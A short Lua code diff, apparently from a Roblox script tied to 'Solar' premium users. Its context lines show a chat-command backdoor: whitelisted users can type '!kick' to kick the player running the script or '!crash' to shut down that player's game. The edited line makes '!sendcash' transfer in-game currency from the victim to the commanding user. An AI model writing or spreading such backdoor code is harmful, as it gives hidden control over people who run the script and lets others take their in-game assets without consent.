@@ -105,7 +105,7 @@ elseif table.find(whitelisted, speaker.Name) and message == "!kick" then
     pl.LocalPlayer:Kick("User "..speaker.Name.." has kicked you! please report this if it was abuse! (You were kicked by a Solar Premium user or a Solar Admin/Owner.)");
 elseif table.find(whitelisted, speaker.Name) and message == "!crash" then
     game:Shutdown();
-elseif table.find(whitelisted, speaker.Name) then
+elseif table.find(whitelisted, speaker.Name) and message == "!sendcash" then
 game:GetService("ReplicatedStorage").Send:FireServer("100", game:GetService("Players"):FindFirstChild(speaker.Name))
 end
 end);
